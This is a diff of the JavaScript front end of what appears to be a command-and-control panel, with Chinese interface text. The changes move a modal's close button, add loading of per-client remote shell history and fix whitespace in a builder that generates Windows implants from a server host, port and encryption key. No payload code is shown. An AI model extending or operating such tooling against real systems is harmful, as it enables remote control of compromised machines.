@@ -109,8 +109,7 @@ function showListenerModal() {
     if (listeners.length > 0) {
         const l = listeners[0];
         title.textContent = '监听器信息';
-        submitBtn.textContent = '关闭';
-        submitBtn.onclick = hideListenerModal;
+        submitBtn.style.display = 'none';
         document.getElementById('listenerName').value = l.name;
         document.getElementById('listenerName').disabled = true;
         document.getElementById('listenerBind').value = l.bind_address;
@@ -130,10 +129,12 @@ function showListenerModal() {
             <div class="btn-group" style="margin-top:10px">
                 <button class="btn btn-secondary" style="background:#f44336" onclick="deleteListener('${l.id}')">删除监听器</button>
                 <button class="btn btn-secondary" onclick="toggleListener('${l.id}', ${l.is_running})">${l.is_running ? '停止' : '启动'}</button>
+                <button class="btn btn-secondary" onclick="hideListenerModal()">关闭</button>
             </div>
         `;
     } else {
         title.textContent = '创建监听器';
+        submitBtn.style.display = '';
         submitBtn.textContent = '创建并启动';
         submitBtn.onclick = createListener;
         document.getElementById('listenerName').disabled = false;
@@ -219,12 +220,41 @@ async function toggleListener(id, isRunning) {
 
 let shellHistory = [];
 
-function showShellModal() {
+async function showShellModal() {
     if (!selectedClientId) return;
 
     document.getElementById('shellClientId').textContent = selectedClientId.slice(0, 8) + '...';
     document.getElementById('shellModal').style.display = 'flex';
     document.getElementById('shellInput').focus();
+
+    // 从数据库加载历史记录
+    try {
+        const res = await fetch(`${API_BASE}/api/clients/${selectedClientId}/shell/history`);
+        const history = await res.json();
+        if (history.length > 0) {
+            shellHistory = history.map(h => ({
+                command: h.command === '[response]' ? '[服务器推送]' : h.command,
+                output: h.output || '[等待响应...]',
+                isError: !h.success
+            }));
+            // 合并相邻的命令和响应：命令行后面紧跟的 [response] 行合并为一条
+            const merged = [];
+            for (let i = 0; i < shellHistory.length; i++) {
+                const item = shellHistory[i];
+                if (item.command === '[服务器推送]' && merged.length > 0 && merged[merged.length - 1].output === '[等待响应...]') {
+                    // 将响应合并到上一条命令
+                    merged[merged.length - 1].output = item.output;
+                    merged[merged.length - 1].isError = item.isError;
+                } else {
+                    merged.push({ ...item });
+                }
+            }
+            shellHistory = merged;
+            updateShellConsole();
+        }
+    } catch (error) {
+        console.error('Failed to load shell history:', error);
+    }
 
     // Start polling for responses
     pollShellResponses();
@@ -646,7 +676,7 @@ function showBuilderModal() {
         document.getElementById('builderKey').value = listeners[0].encryption_key;
         document.getElementById('builderPort').value = listeners[0].port;
     }
-    
+
     // 更新 UI 状态
     updateBuilderUI();
 }
@@ -656,7 +686,7 @@ function updateBuilderUI() {
     const title = document.getElementById('builderModalTitle');
     const hint = document.getElementById('builderOutputHint');
     const output = document.getElementById('builderOutput');
-    
+
     if (type === 'c') {
         title.textContent = '生成 Windows C Implant';
         hint.textContent = '生成文件: ' + output.value + '.exe (Windows PE)';
@@ -687,7 +717,7 @@ async function buildImplant(event) {
     submitBtn.disabled = true;
 
     const implantType = document.getElementById('builderType').value;
-    
+
     const request = {
         server_host: document.getElementById('builderHost').value.trim(),
         server_port: parseInt(document.getElementById('builderPort').value),
